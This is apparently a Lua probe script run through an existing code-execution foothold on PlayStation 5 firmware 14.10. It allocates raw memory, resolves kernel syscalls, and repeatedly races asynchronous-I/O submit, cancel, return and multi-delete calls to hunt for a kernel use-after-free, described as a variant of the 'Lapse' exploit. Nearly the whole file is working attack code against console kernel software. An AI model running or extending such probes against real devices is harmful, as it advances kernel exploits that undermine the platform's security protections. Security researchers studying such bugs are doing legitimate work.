-- 14.10 Recon Probe 19c: AIO with correct pipe/socket FD creation
-- 19b showed: pipe(fds) returns rfd=0 wfd=0 — the pointer arg doesn't work
-- The syscall.resolve pattern returns FDs via syscall return value
-- Alternative: use socketpair which DOES use a pointer output on FreeBSD
-- Or use /dev/null, stdin/stdout which are already open

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: AIO PIPES FIX ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_pipe = 42,
    sc_close = 6,
    sc_read = 3,
    sc_write = 4,
    sc_open = 5,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_aio_read = 255,
    sc_aio_write = 256,
    sc_aio_return = 314,
    sc_aio_error = 315,
    sc_aio_cancel = 316,
    sc_aio_multi_wait = 587,
    sc_aio_multi_cancel = 588,
    sc_aio_multi_delete = 589,
})

-- ============================================================
-- PART 1: Figure out how pipe() works on PS5 Lua
-- ============================================================
log("")
log("--- PART 1: pipe creation methods ---")

-- Method A: pipe(fds_ptr) — standard
local fds_a = memory.alloc(8)
memory.write_dword(fds_a, 0xFFFF)
memory.write_dword(fds_a + 4, 0xFFFF)
local pa_ok, pa_ret = pcall(function() return syscall.sc_pipe(fds_a) end)
local pa_rv = pa_ok and pa_ret:tonumber() or -999
local pa_r = memory.read_dword(fds_a):tonumber()
local pa_w = memory.read_dword(fds_a + 4):tonumber()
log(string.format("  pipe(ptr): rv=%d ptr[0]=%d ptr[1]=%d", pa_rv, pa_r, pa_w))

-- On FreeBSD, pipe() returns fds via the pointer. If pa_r and pa_w are
-- still 0xFFFF, the syscall didn't write to them. Check if rv itself has the fd.
if pa_rv >= 0 and pa_r == 0xFFFF then
    log("  pipe didn't write to ptr — rv=" .. pa_rv .. " might be rfd")
    -- The second fd might be in the upper 32 bits or at rv+1
    -- Close rv if it's a valid fd
    pcall(function() syscall.sc_close(pa_rv) end)
end

-- If pipe wrote valid FDs, use them
local pipe_rfd = -1
local pipe_wfd = -1
if pa_r ~= 0xFFFF and pa_r ~= 0 and pa_w ~= 0xFFFF and pa_w ~= 0 then
    pipe_rfd = pa_r
    pipe_wfd = pa_w
    log("  pipe works with ptr! rfd=" .. pipe_rfd .. " wfd=" .. pipe_wfd)
elseif pa_rv >= 3 then
    -- rv is the rfd, but we don't know wfd
    -- On FreeBSD pipe2 the fds go to the pointer, but pipe() puts them in
    -- the return registers (eax=rfd, edx=wfd). The Lua API only gives us eax.
    -- We might have rfd but not wfd.
    log("  pipe rv=" .. pa_rv .. " — might be rfd only, wfd lost")
end

-- Method B: socketpair — uses pointer output on all BSDs
log("")
log("  trying socketpair(AF_UNIX, SOCK_STREAM)...")
local sp_fds = memory.alloc(8)
memory.write_dword(sp_fds, 0xFFFF)
memory.write_dword(sp_fds + 4, 0xFFFF)
local sp_ok, sp_ret = pcall(function()
    return syscall.sc_socketpair(1, 1, 0, sp_fds) -- AF_UNIX=1, SOCK_STREAM=1
end)
local sp_rv = sp_ok and sp_ret:tonumber() or -999
local sp_r = memory.read_dword(sp_fds):tonumber()
local sp_w = memory.read_dword(sp_fds + 4):tonumber()
log(string.format("  socketpair: rv=%d fd[0]=%d fd[1]=%d", sp_rv, sp_r, sp_w))

local sock0 = -1
local sock1 = -1
if sp_rv == 0 and sp_r ~= 0xFFFF and sp_w ~= 0xFFFF then
    sock0 = sp_r
    sock1 = sp_w
    log("  socketpair works! fd0=" .. sock0 .. " fd1=" .. sock1)
end

-- Method C: open /dev/null for a simple fd
log("")
log("  trying /dev/null...")
local dn_ok, dn_ret = pcall(function() return syscall.sc_open("/dev/null", 2) end)
local devnull = dn_ok and dn_ret:tonumber() or -1
log("  /dev/null fd=" .. devnull)

-- ============================================================
-- PART 2: Test aio_read with whatever FDs we have
-- ============================================================
log("")
log("--- PART 2: aio_read test ---")

local AIOCB_SIZE = 256
local test_fd = -1
local write_fd = -1

if sock0 >= 0 then
    test_fd = sock0
    write_fd = sock1
    log("  using socketpair fds: read=" .. test_fd .. " write=" .. write_fd)
elseif pipe_rfd >= 0 then
    test_fd = pipe_rfd
    write_fd = pipe_wfd
    log("  using pipe fds: read=" .. test_fd .. " write=" .. write_fd)
end

if test_fd >= 0 and write_fd >= 0 then
    -- Write data first
    local wbuf = memory.alloc(64)
    for i = 0, 63 do memory.write_byte(wbuf + i, 0x41 + (i % 26)) end
    local w_ok, w_ret = pcall(function() return syscall.sc_write(write_fd, wbuf, 32) end)
    log("  write 32 bytes: " .. (w_ok and "rv=" .. w_ret:tonumber() or "FAIL"))

    -- Build aiocb
    local aiocb = memory.alloc(AIOCB_SIZE)
    local rbuf = memory.alloc(256)
    for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(aiocb + i, 0) end
    for i = 0, 255 do memory.write_byte(rbuf + i, 0xDE) end

    memory.write_dword(aiocb + 0, test_fd)
    memory.write_qword(aiocb + 8, 0)           -- offset
    memory.write_qword(aiocb + 16, rbuf)       -- buf
    memory.write_qword(aiocb + 24, 32)         -- nbytes

    log("  submitting aio_read...")
    local ar_ok, ar_ret = pcall(function() return syscall.sc_aio_read(aiocb) end)
    log("  aio_read: " .. (ar_ok and "rv=" .. ar_ret:tonumber() or "ERR: " .. tostring(ar_ret):sub(1, 50)))

    if ar_ok then
        -- Check completion
        local ae_ok, ae_ret = pcall(function() return syscall.sc_aio_error(aiocb) end)
        if ae_ok then log("  aio_error=" .. ae_ret:tonumber()) end

        local aret_ok, aret_ret = pcall(function() return syscall.sc_aio_return(aiocb) end)
        if aret_ok then
            log("  aio_return=" .. aret_ret:tonumber())
            local b0 = memory.read_byte(rbuf):tonumber()
            local b1 = memory.read_byte(rbuf + 1):tonumber()
            log(string.format("  data: 0x%02x 0x%02x (expect 0x41 0x42)", b0, b1))
        end

        -- ============================================================
        -- PART 3: AIO stress with cancel races
        -- ============================================================
        log("")
        log("--- PART 3: aio submit/cancel stress ---")

        local cancel_ok = 0
        local cancel_err = 0
        local double_ret = 0

        for round = 1, 100 do
            -- Refill socket
            if round % 10 == 1 then
                for i = 1, 10 do
                    pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)
                end
            end

            local cb = memory.alloc(AIOCB_SIZE)
            local buf = memory.alloc(64)
            for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb + i, 0) end
            memory.write_dword(cb, test_fd)
            memory.write_qword(cb + 16, buf)
            memory.write_qword(cb + 24, 16)

            -- Submit
            local s_ok = pcall(function() syscall.sc_aio_read(cb) end)
            if not s_ok then
                cancel_err = cancel_err + 1
            else
                -- Immediately cancel
                local c_ok, c_ret = pcall(function()
                    return syscall.sc_aio_cancel(test_fd, cb)
                end)
                if c_ok then
                    cancel_ok = cancel_ok + 1
                else
                    cancel_err = cancel_err + 1
                end

                -- Collect
                pcall(function() syscall.sc_aio_return(cb) end)

                -- Double collect (UAF test)
                local d_ok, d_ret = pcall(function() return syscall.sc_aio_return(cb) end)
                if d_ok and d_ret:tonumber() >= 0 then
                    double_ret = double_ret + 1
                    if double_ret <= 3 then
                        log("  *** DOUBLE aio_return OK round " .. round .. " rv=" .. d_ret:tonumber())
                    end
                end
            end
        end

        log("  100 rounds: cancel_ok=" .. cancel_ok .. " cancel_err=" .. cancel_err)
        log("  double aio_return: " .. double_ret)
        if double_ret > 0 then
            log("  *** POTENTIAL UAF: aio_return succeeded after cancel+return ***")
        end

        -- ============================================================
        -- PART 4: aio_multi_cancel stress
        -- ============================================================
        log("")
        log("--- PART 4: aio_multi_cancel ---")

        -- Submit a batch of AIOs
        local batch_cbs = {}
        for i = 1, 8 do
            pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)

            local cb2 = memory.alloc(AIOCB_SIZE)
            local buf2 = memory.alloc(64)
            for j = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(cb2 + j, 0) end
            memory.write_dword(cb2, test_fd)
            memory.write_qword(cb2 + 16, buf2)
            memory.write_qword(cb2 + 24, 8)

            local s2_ok = pcall(function() syscall.sc_aio_read(cb2) end)
            if s2_ok then
                batch_cbs[#batch_cbs + 1] = cb2
            end
        end
        log("  submitted " .. #batch_cbs .. " AIOs")

        -- Build array for multi_cancel
        local arr = memory.alloc(#batch_cbs * 8 + 8)
        for i, cb in ipairs(batch_cbs) do
            memory.write_qword(arr + (i - 1) * 8, cb)
        end

        local mc_ok, mc_ret = pcall(function()
            return syscall.sc_aio_multi_cancel(arr, #batch_cbs, 0, 0, 0, 0)
        end)
        log("  aio_multi_cancel: " ..
            (mc_ok and "rv=" .. mc_ret:tonumber() or "ERR: " .. tostring(mc_ret):sub(1, 50)))

        -- Collect all
        for i, cb in ipairs(batch_cbs) do
            local r2_ok, r2_ret = pcall(function() return syscall.sc_aio_return(cb) end)
            if r2_ok then
                log("    aio[" .. i .. "] return=" .. r2_ret:tonumber())
            end
        end

        -- ============================================================
        -- PART 5: aio_multi_delete after cancel (Lapse variant)
        -- ============================================================
        log("")
        log("--- PART 5: aio_multi_delete ---")

        -- Submit one more
        pcall(function() syscall.sc_write(write_fd, wbuf, 16) end)
        local dcb = memory.alloc(AIOCB_SIZE)
        local dbuf = memory.alloc(64)
        for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(dcb + i, 0) end
        memory.write_dword(dcb, test_fd)
        memory.write_qword(dcb + 16, dbuf)
        memory.write_qword(dcb + 24, 8)

        pcall(function() syscall.sc_aio_read(dcb) end)

        -- Cancel it
        pcall(function() syscall.sc_aio_cancel(test_fd, dcb) end)

        -- Now try aio_multi_delete on the cancelled/completed AIO
        local darr = memory.alloc(8)
        memory.write_qword(darr, dcb)
        local md_ok, md_ret = pcall(function()
            return syscall.sc_aio_multi_delete(darr, 1, 0, 0, 0, 0)
        end)
        log("  aio_multi_delete: " ..
            (md_ok and "rv=" .. md_ret:tonumber() or "ERR: " .. tostring(md_ret):sub(1, 50)))

        -- Try return after delete (should fail)
        local pd_ok, pd_ret = pcall(function() return syscall.sc_aio_return(dcb) end)
        log("  aio_return after delete: " ..
            (pd_ok and "rv=" .. pd_ret:tonumber() or "ERR"))
        if pd_ok and pd_ret:tonumber() >= 0 then
            log("  *** aio_return after delete succeeded! ***")
        end
    end
else
    -- No bidirectional FDs available — try aio_read on /dev/null
    log("  no socketpair/pipe available")
    if devnull >= 0 then
        log("  trying aio_read on /dev/null (fd=" .. devnull .. ")...")
        local aiocb = memory.alloc(AIOCB_SIZE)
        local rbuf = memory.alloc(256)
        for i = 0, AIOCB_SIZE - 1, 8 do memory.write_qword(aiocb + i, 0) end
        memory.write_dword(aiocb, devnull)
        memory.write_qword(aiocb + 16, rbuf)
        memory.write_qword(aiocb + 24, 32)

        local dn_aio_ok, dn_aio_ret = pcall(function() return syscall.sc_aio_read(aiocb) end)
        log("  aio_read(/dev/null): " ..
            (dn_aio_ok and "rv=" .. dn_aio_ret:tonumber() or "ERR: " .. tostring(dn_aio_ret):sub(1, 50)))
    end
end

-- Cleanup
if sock0 >= 0 then pcall(function() syscall.sc_close(sock0) end) end
if sock1 >= 0 then pcall(function() syscall.sc_close(sock1) end) end
if pipe_rfd >= 0 then pcall(function() syscall.sc_close(pipe_rfd) end) end
if pipe_wfd >= 0 then pcall(function() syscall.sc_close(pipe_wfd) end) end
if devnull >= 0 then pcall(function() syscall.sc_close(devnull) end) end

log("")
log("=== AIO PIPES FIX DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
